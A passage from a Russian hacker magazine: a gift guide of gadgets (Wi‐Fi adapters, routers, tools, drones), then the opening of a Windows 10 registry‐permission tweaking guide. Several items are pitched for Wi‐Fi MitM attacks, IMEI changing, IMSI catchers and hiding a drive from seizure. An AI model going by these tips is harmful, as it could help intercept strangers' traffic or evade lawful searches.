          TP-LINK WN722N





Официальный сайт
   Если хочешь подарить что‐нибудь практичное, что бы наверняка пригоди‐
лось в хозяйстве, то Wi‐Fi‐адаптер TP‐Link WN722N — это отличный выбор.
А вот «свисток» на чипе Atheros открывает воз можность проводить самые
разные атаки на Wi‐Fi. Малое энергопотребление позволяет подключать его
к устройствам на  Android через USB‐OTG. Стоит  такой адаптер  око‐
ло 700 рублей, но нужно искать версию 1.x. Вторая версия, увы, уже на чипе
Realtek RTL8188EUS.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 64   ПОДАРКА ДЛЯ ГИКА
           ВЫБИРАЕМ ЛУЧШИЕ ХАКЕРСКИЕ ГАДЖЕТЫ
                        ДЛЯ ДРУЗЕЙ И ДЛЯ СЕБЯ





                  25

               GL-MIFI





Официальный сайт
  Портатив ный роутер, который может раздавать мобильный интернет, —
это полезное устрой ство независимо от того, будет ли получатель подарка
его использовать как хакерский девайс или нет. GL‐MiFi — это небольшая
коробочка с чипом Atheros AR9331, слотом для мини‐симки, батарейкой
и (опционально) парой внешних штыревых антенн.
   Если тебе хочется заиметь мобильный и ано нимизирующий роутер или же
сделать свой WiFi Pineapple, MiFi — твой выбор. Стабильный и классный Ath‐
eros AR9331 + модем Quectel EC20/EC25 = потрясающе удачный и недорогой
девайс.
  На Atheros SoC спокойно собира ется OpenWRT/LEDE, производитель
изначально поставляет про шивку именно на основе OpenWRT. Также с сай та
производителя можно скачать готовые билды с поддержкой Tor. Однако луч‐
ше собрать прошивку самому и дополнить ее софтом из WiFi Pineapple.
  Наработки по превращению любого подходящего роутера в «Ананас» ищи
в репозитории Оле га Купреева, одного из авторов этой статьи.
   Кстати, модем Quectel EC20/EC25 заслуживает отдельного внимания, так
как он самый хакабель ный на данный момент. То есть прошивку можно
модифицировать под свои нужды, а также сменить IMEI или же сделать IMSI
Catcher. Все это и многое дру гое можно сделать с этим модемом, благо внут‐
ри у него чипсет Qualcomm MDM9615.
   Также бонус в виде наличия приемни ка GPS/ГЛО НАСС в модеме позволя‐
ет использовать роутер для соз дания своей карты Wi‐Fi c помощью связ ки
Kismet + GPSD. Роутер — однозначный маст хэв — пригодится точно.
  В полной комплектации GL‐MiFi обой дется при мерно в 100 долларов, есть
доставка в Россию.


                  26

            WIFI PINEAPPLE





Официальный сайт
  Известное устрой ство для быс тро го проведения MitM‐атак по  Wi‐Fi.
Девайс прикидывается другой точкой доступа (например, откры тым хотспо‐
том в кафе) и собирает урожай тра фика с бес проводных устройств довер‐
чивых пользователей.
   Технически WiFi Pineapple — это миниатюрный роутер с прошивкой Open‐
WRT и тремя сетевыми интерфейсами: один LAN и два WLAN. Оба беспро‐
водных интерфейса можно переключать в режим мониторинга. В прошивку
загружены Karma, PineAP и другие хакерские утилиты (набор зависит от вер‐
сии). Для проведения типовых атак на корпусе устройства даже есть мини‐
атюрные переключатели.
  Самая дешевая версия NANO Basic обойдет ся тебе в 100 дол ларов,
пофичастее будет стоить до 230. Антирекламу делать не хотим (у «Ананаса»
куча фанатов), но, на наш взгляд, устрой ство слишком дорогое. Если хочешь
подарить именно такой — бери. Но куда интереснее попробовать собрать
что‐то похожее на базе роутеров GL‐Inet.


                   27

         GPD POCKET





Indiegogo
   Что ты знаешь о миниатю ризации? Каков бы ни был ответ, ребята из GPD
знают об этом намного больше. Они умудрились запихнуть пол ноценный
ноутбук в корпус размером с семидюймовый планшет. И это не какой‐то
обрезок телефона в форме рас кладушки, а довольно неплохая система
на базе четырехъядерного Intel Cherry Trail X7‐Z8700 с 8 Гбайт оперативки,
128 Гбайт постоянной памяти, двумя USB‐портами, HDMI‐выходом и Windows
10 на борту (как вариант: Ubuntu). Цена: 30 тысяч рублей, что очень неплохо
для практически идеального инстру мента вардрайвера.


                  28

         OCKEL SIRIUS B





Официальный сайт
  На вид эта штука похожа на внеш ний жес ткий диск, но в реальности
это целый компьютер с полноценной Windows 10. Достаешь его из широких
штанин, подклю чаешь монитор, клавиату ру и мышь и можешь работать.
Характеристики, конечно, соответствуют размеру и цене: 4 Гбайт оператив‐
ной памяти, 32 или 64 Гбайт флеша, чип Atom x5‐Z8350. Стоит такой компь‐
ютер от 299 долларов, дос тавку в Россию можно организовать, если заказы‐
вать через Indiegogo.


                  29

        ASUS VIVOSTICK PC





Официальный сайт
  Еще один пор татив ный компьютер с Windows 10 (редакции Home), на этот
раз в совсем миниатюр ном корпусе и вставляется прямо в HDMI. На боку
зато есть два USB и аудиовыход. Да, 2 Гбайт оперативки и 32 Гбайт
флеш‐памяти — это малова то, а все тот же Atom x5‐Z8350 — далеко
не самый быстрый процес сор. Но для медиацентра или еще каких‐нибудь
забав должно хватить. Продает ся у нас и стоит около 10 тысяч рублей.


                 30

          LENOVO X220





Wikipedia
   Если говорить про подарки, которые хотелось бы получить самому, то тут
частенько в вер хних строчках хит‐парада оказыва ется новый ноутбук. А если
покупаешь сам на подаренные день ги, то иногда сойдет и старый ноутбук.
В общем, как бы ни повернулось дело, рекомендуем Lenovo X220.
   Этот ноут — нестареющая хакерская классика. От X201 до X230 — те
самые культовые «Леновы», в которых прекрасно все — от клавиатуры до воз‐
можности переломать и починить каждый сантиметр. Неубиваемый дизайн,
возможность впихнуть до 16 Гбайт оперативки, GSM‐модуль, накатить core‐
boot, если ты ﬁrmware‐хакер, и еще много чего. Надежный проверенный ноут.
  Мы в редакции «Хакера» брали не одну X220. Совету ем перед покупкой
внимательно посмотреть компьютер, а в идеале вскрыть и посмотреть
материнку. Скорее всего, ты обнаружишь порванную изоляционную бумагу,
строительный скотч, отсутс твие половины деталей и неработающую лампочку
подсветки. Это — нор мально, смело сбрасывай цену с двадцати тысяч руб‐
лей до пяти, торгуясь с барыгой на останках Митинского радиорынка в Мос‐
кве (личный опыт  :)). А затем беги в ближайший магаз, покупай 16 Гбайт
памяти, SSD и наслаждайся компь ютером для любых гик‐экспериментов
в пределах 20 тысяч рублей.
   Ах да, не забудь про наклейки на крышку. А то будет не тру :).


                    31

    TISHRIC 60CM PCI-E EXTENDER





AliExpress
  Всего за 250 рублей этот райзер позволит подклю чить (еще одну) виде‐
окарту с интерфейсом PCI‐Express x16 и разъемом PCI‐E x1. Тре бует подклю‐
чения к портам USB 3.0 (для переда чи данных) и SATA power (питание). Длина
комплектного кабеля — 60 см. Он поз волит вынести объемную и горячую
видюху за пределы корпуса. Научные расчеты, майнинг, перебор паролей —
видеокартам всегда найдутся вычислительно сложные задачи.


                   32

 GERBER CENTER-DRIVE MULTI-TOOL





Официальный сайт
   Удобный мультитул — вещь бес ценная, но и выбор тут огромный. Помимо
продукции всем известных Leatherman и Victorinox, есть и необычные новинки
других производите лей. Например, американская фирма Gerber недавно
выпустила инструмент под названием Center‐Drive, главное дос тоинс тво
которого — отвертка, которая не смещена относительно центральной оси.
Надо ли говорить, что отвертка в нашем деле чуть ли не самый важный инс‐
трумент? Кроме нее, есть плоскогуб цы, нож, пила, открывалка и прочие при‐
ятные мелочи вроде встроенных в плоскогубцы кусачек, шила и держателя
для сменной биты. Всего в мультитуле 16 инс трументов плюс комплект
из тридцати сменных бит для отвертки. Цена на Amazon — 85 дол ларов, там
же можно оформить доставку в Рос сию.


                    33

   LEATHERMAN TREAD BRACELET





Официальный сайт
   Нет, этот модный аксессуар не сбежал в нашу подборку из журнала «Кос‐
мополитен». Это представитель набирающего популярность вида муль‐
титулов, которые носят на запястье. Снимаешь, выбираешь нужный инс тру‐
мент и используешь остальной брас лет как рукоять. Звенья снимаются, что
позволяет подстроить  раз мер и выб рать самые нужные инструменты.
У Leatherman Tread входит 29 звеньев — множество отверток и ключей, пара
крюков, открывалка, стеклорез и булавка для извлечения симки из телефона.
Цвета: черный или стальной, цена — 175 долларов, есть доставка с Amazon.


                  34

        IFIXIT PRO TECH TOOLKIT





Официальный сайт
  Разобрать все на свете поможет хороший набор инструментов. На AliEx‐
press их огромный выбор, но если хочешь гарантии качества, то очевидный
выбор — это Pro Tech Toolkit фирмы iFixit. Он ори ентирован в первую очередь
на вскрытие электроники вроде мобильных телефонов, планшетов и ноут‐
буков. В него вхо дит более 70 инс трументов: отвертка со сменными битами,
гладилки для вскрытия корпусов, антистатический браслет и многое дру гое.
Удобная  сумка поможет  не  рас терять  все  богатство.  Кстати, просят
за него 60 долларов и готовы отпра вить в Россию.


                   35

ПА ЯЛЬНАЯ СТАН ЦИЯ HAKKO C ЖАЛОМ
               T12





Официальный сайт (жало), рос сийский импортер
  Паяльная станция Hakko — отличный выбор на смену тому барахлу,
которым ты, твой друг или особо крутая подруга вынуждены пользоваться,
когда надо что‐то куда‐то припаять. Помимо портативности и модного вида,
станции имеют ряд преимуществ:
 • разогрев за пару секунд;
 • хорошо держит температуру;
 • возможность калибровки под каждое жало;
 • возможность перепрошивки, бла го контрол лер на базе STM32;
 • возможность соб рать самому из набора (тема на любителя).

Если кратко, то с Hakko и T12 паять легко и при ятно, а воз можность калиб‐
ровки позволяет контролировать температу ру жала с точностью до градуса.
Цена самого жала — 1750 руб лей, паяльных станций — от 15 тысяч рублей,
но это стоит того. В общем, про щай, Lukey, привет, Hakko!


                        KSGER            APPAНедоро гая паяль ная стан ция      и муль тиметр
Если  подыскиваешь  недорогие  и  небольшие  по  размеру  устройства
для эксперимен тов с железом, обрати внимание на эту парочку:
 • паяльная  станция KSGER  V2.01  T12 STM32 OLED  Soldering  Station
   на STM32 за 45 дол ларов;
 • мультиметры APPA iMeter CARD TYPE MULTIMETERS. Цены варьируются.



                  36

   01 DIMENSIONING INSTRUMENT





Официальный сайт
   Так называемый «прос транственный измеритель» фирмы InstruMMents —
это необычный новый прибор, который позволя ет точно обме рить любой
трехмерный объект. Прос то прокатываешь им по дуге, и ее параметры
передаются в приложение на телефо не. Отличный подарок любому, кто увле‐
кается 3D‐моделирова нием или часто что‐то мас терит. Цена — 105 дол‐
ларов, есть доставка в Россию. В качес тве наконечника можно выбрать
карандаш, ручку или стило для планшета.


                    37

        3DOODLER CREATE





Официальный сайт
  Мы решили не вклю чать в наш список 3D‐прин теры, поскольку это все же
скорее профессиональное обо рудование,  которое  нужно  не  каждому.
А вот 3D‐ручка, которая рисует плас тиком, — это недорогая и забавная вещь,
с которой интересно побаловать ся. Каждый, кто когда‐то владел советским
выжигателем по дереву, должен пус тить носталь гическую слезу. Вари антов
моделей 3D‐ручек — масса. 3Doodler Create сто ит в районе 9000 рублей,
но если это не твой бюджет, то ты без труда най дешь китайские аналоги
в два‐три раза дешевле.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 64   ПОДАРКА ДЛЯ ГИКА
           ВЫБИРАЕМ ЛУЧШИЕ ХАКЕРСКИЕ ГАДЖЕТЫ
                        ДЛЯ ДРУЗЕЙ И ДЛЯ СЕБЯ





                  38

KINGSTON DATATRAVELER LOCKER+ G3





Официальный сайт
  Быстрая и надежная флешка со встроенным криптопроцессором. Он
обеспечивает шифрование по алгоритму AES с длиной ключа 256 бит
в режиме сцепления бло ков шифртекста (CBC). Все криптографические про‐
цедуры происходят непосредс твенно в его защищенной памяти. Никакой
софтовой фигни. Только hardware, только hardcore!
   Как и у других быстрых флешек, скорость зависит от числа использован‐
ных каналов контрол лера. На каждый канал подклю чается своя микросхе ма
памяти, поэтому скорость коррелиру ет с объемом.
  При работе нескольких чипов NAND, быстро го  контрол лера  Phison
PS2313 и криптопроцессора неизбежен наг рев. Поэтому флешка помещена
в металлический корпус для лучшего охлаждения и механи ческой прочности.
Стоимость флешек начина ется с 20 долларов за 8 Гбайт.


                  39

     TRANSCEND JETFLASH 750





Официальный сайт
  Быстрая флешка с большим ресурсом перезаписи. В ней гарантируется
использование чипов MLC NAND, а не копеечных TLC‐микросхем памяти.
Рекомендуется для запуска портейбл‐софта и ОС в Live‐режиме.
   У JF750 хорошее охлаждение за счет длинного корпуса и есть индикатор
активности, что в наше время — большая редкость. Пластиковый корпус дос‐
таточно прочный и повыша ет ремонтопри годность (извлечь данные напрямую
с чипов памяти — не проблема). Самое при ятное — адекватная цена
от 800 рублей. Аналоги других производителей стоят гораздо дороже.


                40

        MUSHKIN IMPACT





Amazon
  Еще одна быстрая и надежная флеш ка. Внутри — скоростной контроллер
Phison PS2251‐08 и чипы MLC NAND производства Toshiba. К сожалению,
официально в Россию не поставляется, а на Ама зоне обойдется примерно
в 40 долларов.


                   41

      EVTRAN USB 3.0 DIY-KIT





AliExpress
   Какой бы ни была флешка, дарить ее — не очень весело даже себе. Куда
менее заурядный подарок — это набор, из которо го можно собрать собс‐
твенную флешку. Сделать это можно с помощью набора eVtran, паяльной
станции для SMD‐монтажа и прог рамма тора. Контроллер Innostor IS903 уже
распаян на плате, а чипы памяти приобретаются отдельно. Зато ты волен
выбрать любой тип надежной памяти — eMLC или даже SLC. Обойдется такой
конструктор для мальчиков пос тарше в 600 рублей.


                  42

              DJI SPARK





Официальный сайт
  Портатив ный квадрокоптер для использования дома и на улице. В воздухе
может держаться до 16 минут и улетать на два километра, не переставая
передавать видео. Среди интерес ных фич, которые станут допол нительным
развлечением и помощью новичкам, — интеллектуальные режимы полетов
и жестовое управление. По меркам квадрокоптеров Spark относительно
дешев — 40–45 тысяч рублей. Ну а по меркам подарков, конечно, относится
к роскошным.


                  43

         PARROT SWING





Официальный сайт
  Интересный вариант квадрокоптера подешевле и поменьше — это про‐
дукт конкурирующей фирмы Parrot. У Swing нет камеры, он скорее предназна‐
чен для оттачивания мас терства пилота жа. Ори гинальная конс трукция поз‐
воляет ему вертикально поднимать ся, а затем лететь подобно самолету.
Это открывает дорогу впечат ляющим воздушным трюкам, которые можно
исполнять как вживую, так и заранее зап рограммировав на прос теньком язы‐
ке. Стоит такое чудо 10–12 тысяч руб лей.


                 44

              TILE MATE





Официальный сайт
  В мире, где все сле дят за всеми, мы до сих пор вынуждены искать связ ку
клю чей, ориентируясь с помощью ана логовых сенсоров, встроенных в наши
тела. Почему нельзя прос то включить смартфон и увидеть, где они находят‐
ся? Потому что для этого нужен специальный брелок. Tile Mate — Bluetooth‐
маячок в форме брелока. Прос то цеп ляешь его к ключам, а когда они про‐
падут из виду — запускаешь приложение и видишь последнее мес тополо‐
жение либо заставляешь ключи издать звук. Сис тема работает и в обратную
сторону — нажимаешь два раза на брелок, и смартфон издает звук. Цена —
20 долларов за одну штуку или 100 долларов за комплект из восьми бре‐
локов.


                 45

          POWERUP





Официальный сайт
  Новые модели MacBook и MacBook Pro, как известно, лишены каких‐либо
портов, кроме USB‐C. Через них работает даже зарядка! Конечно же, в про‐
даже сразу появились раз ношерс тные донглы, хабы и станции. PowerUp отно‐
сится к наиболее элегантным вариантам: это зарядка, в которую встроен хаб
на три USB‐A: удоб но заряжать другие устрой ства или под ключать флешки
и внешние диски. В общем, если у твоего друга новый MacBook и ты уже слы‐
шал, как он ворчит что‐то о портах, то PowerUp — это стоящий подарок. Кста‐
ти, стоит он 129 дол ларов, есть доставка в Рос сию.


                 46

         GRIFFIN BREAKSAFE





Официальный сайт
  В безумном мире Apple провод может стоить столько, что сам по себе
сойдет за подарок. Но Griﬃn BreakSafe — не прос той провод. Это оче редной
аксессуар, который возвращает новым макбукам утерянные фичи. В осно‐
вании BreakSafe — магнитные контакты, которые разъ единяются, если про‐
вод дернуть или споткнуться об него, — почти точь‐в‐точь такие же, как были
в   прежнем   эппловском   коннекторе   MagSafe.  В   отечественных
интернет‐магазинах такой проводок стоит в рай оне 3 тысяч рублей.


                  47

       XIAOMI USB-C CHARGER





AliExpress
   Этот адаптер быстро заряжает все: ноутбуки Dell и HP (смотри на мощ‐
ность  оригинального  адаптера),  MacBook, смартфоны  Moto  Z,  Lumia
950 и 950XL, а также устройства с Quick Charge 3.0 (проверили, работает).
Более того, с соответствующим кабелем USB‐C → Lightning за полтора часа
заряжается и iPad Pro 12,9. Единс твенное устройство, которое «не завелось»
от этого адаптера, — смартфон Gigaset ME, а OnePlus 5 способен взять
от адаптера не более 1,5 А при напряжении 5 В. На AliExpress эта штука стоит
в районе 1400 рублей.


                 48

          SONY MP-CL1





Официальный сайт
   Это портатив ный проектор весом 200 граммов, который можно подклю‐
чить к телефону или любому другому устройству и смотреть кино в HD (1080 ×
720). Снабжен системой лазерной фокусировки, что избавляет владельца
от необходимости использовать жестко заданное расстояние. От батарейки
работает до двух часов: на «Планету страха» хва тит, на «Криминальное чти‐
во» — только с дозарядкой. Подарок недешевый — отдать придется в рай‐
оне 35 тысяч рублей. Так что дарить его лучше всего себе любимому. :‐)


                 49

     LOGITECH WIRELESS CRAFT





Официальный сайт
   Logitech стабильно год за годом выкаты вает клавиатуры и мыши со все
новыми придумками и прибамбасами. Модель Craft — это бес проводная кла‐
виатура с крутящимся колесиком в левом вер хнем углу (привет старине Griﬃn
PowerMate!). Еще из приятного — подсветка и блок цифровых клавиш. Заяв‐
лена полная сов местимость с продуктами Microsoft и Adobe: если твой друг
не вылезает из Photoshop, Premiere или Audition, то это достойный подарок.
Craft продается в России и стоит 10–12 тысяч руб лей.


                50

          SNES CLASSIC





Официальный сайт
   Super Nintendo — одна из лучших консолей всех времен и народов. Да, ее
эмулятор будет работать на всем, что шевелит ся, включая твой компьютер,
Raspberry Pi и бабушкин телефон с дисковым номеро набирателем. Но мини‐
атюрная SNES с классическими геймпадами — это автоматический хит, и в
Nintendo об этом знают. В комплекте неплохой и сбалансированный набор
игр, который умельцы тут же научились расширять. Приставка продается
у нас и стоит 4–5 тысяч рублей.


                   51

             BITTBOY





Официальный сайт
   Если ты ищешь недорогую карманную игрульку и аутентичность для тебя
не так важна, то можешь посмотреть на BittBoy — приставку, выполненную
в стиле GameBoy с 2,2‐дюймовым IPS‐экра ном, выходом на ТВ и 300 играми
NES в комплекте. Сто ит в районе 40 долларов.


                  52

 KINGSPEC SSD EUSB 16 ГБ DOM SSD





AliExpress
  Миниатюрный,  непохо жий  на  обычный  SSD,  скрытый  накопитель
с памятью NAND MLC, который подключается прямо к внутренним портам
материнской платы. На нем можно хра нить любые данные, особенно если
они записаны в криптоконтейнере. Устройство выглядит непривычно, поэтому
с большой вероятностью его не заметят при изъятии жестких дисков и обыч‐
ных флешек. Стоит 25 долларов.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 64   ПОДАРКА ДЛЯ ГИКА
           ВЫБИРАЕМ ЛУЧШИЕ ХАКЕРСКИЕ ГАДЖЕТЫ
                        ДЛЯ ДРУЗЕЙ И ДЛЯ СЕБЯ





                   53

    CONVOY S2+ UV 365NM LED
            FLASHLIGHT





AliExpress
  В отличие от большинства безымянных поделок с синими светодиодами,
едва захватывающими ближний ультрафиолет, это действительно фонарь
УФ‐спектра (365  нм). С ним прекрасно видны УФ‐метки любого типа
на документах, он незаменим для поиска дефектов на экранах, платах, разъ‐
емах и поверхностях практичес ки любого типа.
  Заодно с ним можно увидеть мно жес тво биологических следов и раз‐
личных загрязне ний, которые не видны невоору женным глазом. Помни: в пра‐
вилах хорошего тона не просить сразу же про верить такое устройство, если
кому‐то его даришь. Цена на «Али» — 1600 руб лей.


                 54

             YUBIKEY





Официальный сайт
   Стартап Yubico занимается выпус ком кро хотных карточек, которые обес‐
печивают простую и удобную двухфакторную авторизацию. Вставляешь Yu‐
bikey в USB, прикасаешь ся к сенсору, и карта соз дает и передает драйверу
одноразовый пароль на основе хранящегося на Yubikey тайного ключа. Прог‐
рамма выполняет обратный алго ритм и убеждается, что полученная пос‐
ледовательность  действительно  соответству ет  карте.  Это  интерес ный
подарок для тех, кто серь езно относится к защите личных данных. Карты
бывают в формате брелока или совсем кро хотные — чтобы удобно было
оставить в USB. В России можно найти за 3–4 тысячи рублей.


                  55

          SONY BSP 60





Официальный сайт
   Вот мы и дош ли до странных безумных гаджетов, которые кто‐то вряд ли
купит себе, но с радостью получит в подарок. Беспроводная колонка Sony
BSP 60 — как раз из этой категории. Она может ездить на колесиках. Она
поднимает све тящиеся ушки, становясь похожей на старый будильник. Она
понимает голосовые команды. Ну и конечно, игра ет музыку и показывает наз‐
вание трека. В общем, она напоминает о временах, когда в Sony не стес‐
нялись  делать  всякие чумовые  шту ки. Стоит,  правда,  тоже  довольно
чумовые 16–20 тысяч рублей.


                 56

         OSWATCH MK II





Официальный сайт
  OSWatch Mk  II — опенсорсные умные часы. Они сос тоят из корпуса,
напечатанного на 3D‐принтере, и трех плат внутри него: модуля Microduino
ATmega644PA   с   микроконтроллером   ATmega1284P,   чипа   Bluegiga
BLE112 и регулятора напряжения. Часы подклю чают ся к смартфону по Blue‐
tooth LE и могут быть изго товлены самостоятель но по откры тым специфи‐
кациям. Стоимость проекта варьиру ется в зависи мос ти от комплектующих
и желаемых модификаций. Все они детально описаны на этой страничке. Да,
до Нового года соб рать такой подарок ты вряд ли успеешь, зато это отличный
способ провести праздники!


                   57

DEF CON 25 GLOW IN THE DARK FIDGET
            SPINNER





eBay
   Если твой друг слишком слаб, чтобы сжать кистевой эспандер, подари ему
спиннер с символикой DEF CON 25 за 10 долларов. Хоть чем‐то будет раз‐
минать руки в отрыве от клавиату ры. :)


                 58

SUNGI BLUETOOTH LASER PROJECTION
           KEYBOARD





AliExpress
   Эта лазерная проекционная клавиатура позволит тебе превратить любую
гладкую поверхность в светящуюся клавиатуру с англоязычной раскладкой.
Выглядит совершенно фантастически, осо бенно в темноте. И хоть она
не подойдет для скоростного набора текста и игр, требующих быстрой реак‐
ции, зато позволяет ощутить себя немного в будущем и стоит всего 1600 руб‐
лей.


                 59

           MYCESTRO





Официальный сайт
  Мышки на Новый год дарят только далекие от технологий люди. Нас‐
тоящий подарок гику — это мышка без мышки! Mycestro — нечто вроде коль‐
ца, которое позволяет управлять курсором движением пальца. Это не столько
повседневное решение, сколько более интуитивный аналог тачпаду в ситу‐
ациях, когда настоящая мышь недоступна. Возможно, тому, кому ты его
подаришь, такой девайс и не будет особо нужен, но он уж точно оригиналь‐
нее игровых мышей и клавиатур с подсвет кой кла виш. Стоит 130 долларов
плюс 30 долларов за доставку в Россию.


               60

               ICE ORB





Amazon, Madrobots
   Bluetooth‐колонка — вещь обыденная, она есть у многих. Но много ли ты
знаешь  владельцев  левитирующих  колонок?  ICE Orb —  колонка‐шар,
парящая на высоте 10 мм над основанием. На месте ее удерживают магниты,
а питается она с помощью встроенных акку муляторов. При желании колонку
можно унести на пляж, а затем вер нуть обратно на постамент для подзаряд‐
ки. Цена вопроса: 10 700 рублей.


                  61

      ЧА СЫ — ЖЕС ТКИЙ ДИСК





Варианты на Etsy
  Прошли те времена, ког да гики вскрывали вышедшие из строя жесткие
диски и вешали их на стену. Сегодняшние диски — это набор микросхем,
и никакой ламповости в них нет. Зато теперь на стену можно повесить нас‐
тенные часы, выпол ненные в форме жес ткого дис ка. Есть масса произво‐
дителей, делающих такие часы. Некото рые исполь зуют бутафорские жесткие
диски, но лучше, конечно же, выбрать соб ранные из нас тоящего старого дис‐
ка. Ну или собрать его самому.


                  62

          SPHERO BB-8





Официальный сайт
  Роботы Sphero — и без того забавные и крутые штуковины: резво катаются
по полу, ведомые с телефона джойстиком или самодельной программой.
Роботы Sphero, стилизованные под геро ев «Звез дных войн», кру че еще на
порядок. Если твой друг — фанат Star Wars, смело дари ему почти что нас‐
тоящего BB‐8, BB‐9E или старину R2‐D2. Отдать при дется 10–15 тысяч руб‐
лей в зависимости от комплектации.


                  63

            FLESHLIGHT





Официальный сайт
   Если у твоего друга нет подруги и у вас обоих начисто отсутствуют ком‐
плексы, то... постой, этот совет чуть не зашел куда‐то не туда. В общем, возь‐
ми и подари ему Fleshlight. С одной сто роны, это будет как бы шутка, с дру‐
гой — мы точно знаем, что без дела этот гаджет не пролежит.


                 64

      ПОДПИСКА НА «ХАКЕР»

Подписка в подарок
  Из  сов сем  уж  очевидных вещей — наш  подарочный  сертификат
на годовую подписку на «Хакер». Кста ти, купив ее в подарок, ты увеличишь
свою накопительную скидку. Доступно пря мо сей час и прямо здесь!
PCZONE
ПРОКАЧАЙ
ДЕСЯТКУ !





   Андрей Васильков
 редактор, фронемофил, гик,
          к. м. н. и т. п.
    angstroem@hotbox.ru




НАСТРАИВАЕМ WINDOWS 10
ДЛЯ БЕЗОПАСНОЙ
И КОМФОРТНОЙ РАБОТЫ





В своем развитии Windows прошла долгий путь от графичес‐
кой надстройки над MS‐DOS до клиентской надстройки
над облачным сервисом Microsoft. Превратить ее в пол‐
ноценную операционку вряд ли удастся, но, если подкрутить
глубокие нас тройки, она станет чуточку безопаснее и не
такой своенравной.


           WARNING

                    Прежде  чем  эксперимен тировать  с  реестром
                      и службами, советуем создать точку восстанов‐
                        ления, а еще лучше — сделать полный бэкап сис‐
                      темного раздела.



БЭКАПИМ РЕЕСТР
Один из способов сделать бэкап реестра — это запустить в консоли REG
EXPORT.


reg export HKLM hklm_backup.reg

Такой командой мы задаем соз дание фай ла hklm_backup.reg со всей
информацией из ветки HKEY_LOCAL_MACHINE. Аналогично повторя ем команду
для других веток реестра (см. скриншот).





                     Создаем бэкап реес тра

Так же можно бэкапить отдельные ключи перед их изменени ем. Если что‐то
пойдет не так, ты всегда отка тишь изменения простым запуском .reg‐файла.


ПОЛУЧАЕМ ДОСТУП К РЕЕСТРУ
Программисты наклепали десятки разных твикеров сис темы. Все они обе‐
щают чудеса и работают неп розрачно, но реаль но все их функции сводятся
к трем простым вещам:
 • изменению отдельных клю чей реес тра;
 • остановке невостребованных служб;
 • удалению или добавлению заданий планировщика.

Часто эти процедуры взаимос вязаны. Например, запущенная служба не даст
удалить свой ключ реес тра или автоматически восстановит отмененное
задание в планировщике. Поэто му мы рассмотрим каждую задачу подробно,
не ограничиваясь стандартными рекомендациями.
   Начнем с получения доступа к реестру. Это отдельная проб лема в новых
Windows, особенно десятой версии. По умол чанию админис тратор не может
изменить значения ключей во многих ветках реес тра или удалить файлы
по своему усмотре нию. Он вроде как хозяин, но не совсем.
   Типичная схема управления привилегиями дос тупа Windows удивляет
линуксоида тем, что система имеет более высокие пол номочия, чем любой
аккаунт в группе админов. В дефолтных нас тройках SYSTEM может все, а Ad‐
ministrators — только доз воленное.
  Исправить это недоразумение мож но раз ными «хакерскими» способами,
но большинство из них оставляют брешь в системе и сни жают безопасность
вместо того, чтобы ее повышать. Поэтому рассмотрим более акку ратные
методы. Независимо от объекта (ключа реес тра, фай ла, каталога) сначала
придется стать его владельцем и лишь затем наз начать себе права доступа.


Метод 1 — через regedit
Удобство этого метода в том, что в нем не требуется дополнительно устанав‐
ливать какой‐либо софт. Неудобство — в необ ходимости задавать раз‐
решения для каждого конкретного ключа через графическую оболочку. Хотя
кому‐то это, наоборот, покажется удобным.





               Меняем владельца для Кортаны

Просто запускаем от админа regedit, выделяем желаемый ключ и в контекс‐
тном меню (вызывается правым кликом мыши) переходим в параметр «Раз‐
решения» (Permissions), где меня ем владельца и затем прописы ваем любые
разрешения.





         Задаем разрешения для изменения настроек Кортаны


Метод 2 — через штатную утилиту SubInACL
Скачиваем утилиту SubInACL с сайта Microsoft. В списке под держиваемых ОС
нет Windows 10, но пусть тебя это не смущает. Проверяли, работает. Просто
помни, что программу надо запустить из консоли от имени адми нистратора.
Для этого удобнее сначала скопировать SubInACL.exe в системный каталог
Windows   (%Windir%\System32\),  чтобы  не  вбивать  каждый  раз  путь
до исполняемого файла.





               Копиру ем SubInACL в системный каталог

Далее для SubInACL нужно указать имя модифициру емого объ екта, его тип
и желаемое действие. Объект может быть одного из сле дующих типов: файл
(ﬁle), каталог (folder), определен ный ключ реес тра (keyreg) или запись реес‐
тра со всеми ее дочерними ключами (subkeyreg).
   Как обычно: прежде чем назначать пра ва объекту, нужно стать его вла‐
дельцем. Два действия легко объединить в одну команду, перечислив их
через пробел. Например, следующая команда сначала сделает группу «Адми‐
нистраторы» владельцем ключа AutoLogger (он отвечает за трассировку
событий, происходящих на начальных этапах заг рузки ОС), а затем предос‐
тавит админам пол ный доступ к нему.


SUBINACL /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\
WMI\AutoLogger" /setowner=XTester /grant=XTester=f

Вместо XTester подставь везде имя сво ей учетной записи.
  Используя объекты типа subkeyreg, легко пол ностью разблокировать
реестр. Просто перечисли его корневые ветки по образцу ниже:


subinacl /subkeyreg HKEY_LOCAL_MACHINE /grant=XTester=f
subinacl /subkeyreg HKEY_CURRENT_USER /grant=XTester=f

И так далее.





                 Пример использования SubInACL

Аналогично в одну команду ста новимся владельцами всех файлов и каталогов
на указанном диске.


subinacl /subdirectories %SystemDrive% /grant=XTester=f


Метод 3 — через сто рон нюю бесплатную утилиту SetACL
В целом метод аналогичен использованию штат ной утилиты SubInACL. Отли‐
чия — минимальные.
  Сначала скачиваем фриварную софтину.
   Распаковываем архив и копиру ем из него файл SetACL.exe в каталог
%Windir%\System32 (или 64). Потом запус каем консоль от админа и вызыва‐
ем SetACL. Полный синтаксис использования этой утилиты описан в ру‐
ководстве. Крат кая справка вызывается при запус ке с ключом help.
  Логика утилиты та же, что и у SubInACL: нужно указать имя объ екта, его тип
и действие. Только в случае SetACL это лучше делать отдельными командами.
Например, команда ниже сделает ука занного пользователя (XTester) владель‐
цем ключа автологгера.


SetACL.exe ‐on "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\WMI\
AutoLogger" ‐ot reg ‐actn setowner ‐ownr "n:XTester"

Следующая же команда предоставит ука занной учет ке пол ный доступ к этому
клю чу реестра, то есть позволит изменять его.


SetACL.exe ‐on "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\WMI\
AutoLogger" ‐ot reg ‐actn ace ‐ace "n:XTester;p:full"





            Используем SetACL для задания прав доступа

После того как ты получил воз можность менять любые ключи реестра, самое
время приступить к его модификации.


ОТКЛЮЧАЕМ КОРТАНУ
